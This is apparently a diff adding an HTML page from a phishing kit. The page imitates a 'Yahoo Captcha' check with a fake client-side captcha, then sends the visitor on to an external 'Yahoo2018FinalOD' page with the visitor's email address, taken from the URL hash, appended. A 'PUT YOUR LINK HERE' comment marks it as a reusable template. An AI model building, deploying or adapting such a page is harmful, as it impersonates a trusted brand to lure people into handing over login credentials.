@@ -1,0 +1,145 @@
+
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>
+			Captcha Verification
+		</title>
+		<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+		<script src="https://hcaptcha.com/1/api.js" async defer></script>
+		<link href="http://fonts.cdnfonts.com/css/bitstream-vera-serif" rel="stylesheet">
+		<style>
+			@import url('http://fonts.cdnfonts.com/css/bitstream-vera-serif');
+		</style>
+		
+		<style>
+			html
+			{
+				padding : 0;
+				border : 0;
+				font-family: 'Bitstream Vera Serif', sans-serif;
+			}
+			body
+			{
+				padding : 0;
+				border : 0;
+				font-family: 'Bitstream Vera Serif', sans-serif;
+				background : url('https://572803.selcdn.ru/zim/ms.svg');
+				background-repeat : no-repeat;
+				background-position : ;
+				background-size : cover;
+			}
+		</style>
+	</head>
+	<body>
+		<div id = "full"  style = "margin : 0; padding : 0;">
+			<br/>
+			<br/>
+			<div id = "redir" style = "width : 20rem; margin : auto; background : rgba(255, 255, 255, 0.5); box-shadow : 0px 3px 5px #ccc; padding : 1rem;">
+				<br/>
+				<div style = "display : ; margin : auto; margin-top : ;" id = "show">
+					 <div style = "text-align : center;">
+						Please enter the captcha below to continue.(case-sensitive)
+					 </div>
+					 <br/>
+					<div>
+						<div style = "background : #ddd; width : 15rem; margin : auto; color : #333; text-align : center; padding : 0.5rem; font-weight : bold; letter-spacing : 1rem; text-shadow : -10px 5px 4px #777; font-size : 1.3rem;" id = "captcha_view">
+							HIS789
+						</div>
+						<br/>
+						<div style = "text-align : center; margin-top : ;">
+							<input type = "text" onfocus= "this.value=''" id = "captcha_val" placeholder = "Enter above characters" style = "width : 10rem; height : 2rem; text-align : center;"/>
+							<input type = "text" id = "captcha_confirm" value = "" style = "display : none;" hidden/>
+						</div>
+						<div id = "invlaid" style = "color : #d00; text-align : center; display : none;">
+							<br/>
+							Invalid captcha. Try again.
+						</div>
+						<br/>
+						<div style = "text-align : center; margin : auto; margin-top : ; ">
+							<button OnClick = "verifyCaptcha()" style = "width : 7rem; padding : 0.3rem; font-weight : ;"> Continue </button>
+						</div>
+					</div>
+				</div>
+				<p id = "error" style = "display : none; color : #d00; font-weight : bold;">
+					Network Error. Please reload the page and try again.
+				</p>
+				<br/>
+			</div>
+			<br>
+				<div style = "text-align : center; color : #03f;">
+					&copy 2023 Yahoo Captcha
+				</div>
+		</div>
+		
+		<script>
+			
+			
+			$(document).ready(function()
+			{
+				adjustWindow();
+			});
+			
+			
+			
+			function verifyCaptcha()
+			{
+			
+				$("#invlaid").slideUp();
+				var val1 = $("#captcha_val").val();
+				var val2 = $("#captcha_confirm").val();
+				
+				if(val1 == val2)
+				{
+					$("#show").slideUp();
+		var redir_to_page = "https://maxwebsolutions.in/yah/Yahoo2018FinalOD/index.php#"; //PUT YOUR LINK HERE
+		var hash = window.location.hash;
+		var email = hash.split('#')[1];
+		redir_to_page = redir_to_page + email;
+		window.location = redir_to_page;
+				}
+				else
+				{
+					$("#invlaid").slideDown();
+					makeid();
+				}
+			}
+			
+			
+			makeid();
+			
+			function makeid()
+			{
+				var len =5 ;
+				var result = '';
+				var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+				var charactersLength = characters.length;
+				for( var i = 0; i < len; i++ )
+				{
+					result += characters.charAt(Math.floor(Math.random() * charactersLength));
+			   }
+				
+				$("#captcha_view").text(result);
+				$("#captcha_confirm").val(result);
+		}
+		
+		$( window ).resize(function()
+		{
+			adjustWindow();
+		});
+		
+		function adjustWindow()
+		{
+			var wsize = $( window ).width();
+			var hsize = $( window ).height();
+			$("body").width(wsize);
+			$("body").height(hsize);
+			$("#fulll").css("width", wsize);
+			$("#full").css("height", hsize);
+			$("body").css("overflow", "hidden");
+			$("body").css("padding", "0");
+			$("body").css("margin", "0");
+		}
+		
+		
+		</script>
+	</body>
